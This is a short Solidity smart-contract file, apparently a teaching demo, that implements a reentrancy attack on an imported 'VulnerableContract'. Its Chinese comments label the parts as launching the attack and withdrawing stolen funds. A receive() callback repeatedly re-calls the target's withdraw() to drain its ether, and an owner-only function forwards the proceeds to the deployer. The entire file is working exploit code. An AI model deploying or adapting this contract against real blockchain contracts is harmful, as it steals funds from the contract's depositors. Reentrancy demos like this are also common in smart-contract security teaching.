pragma solidity ^0.8.0;
import "./VulnerableContract.sol";

contract Attack {
    VulnerableContract public vulnerable;
    address public owner;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    // 回调函数，在接收到以太币时触发
    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether);
        }
    }

    // 启动攻击
    function attack() public payable {
        require(msg.value >= 1 ether);
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw(1 ether);
    }

    // 提取从合约中盗取的资金
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    // 获取攻击合约的余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}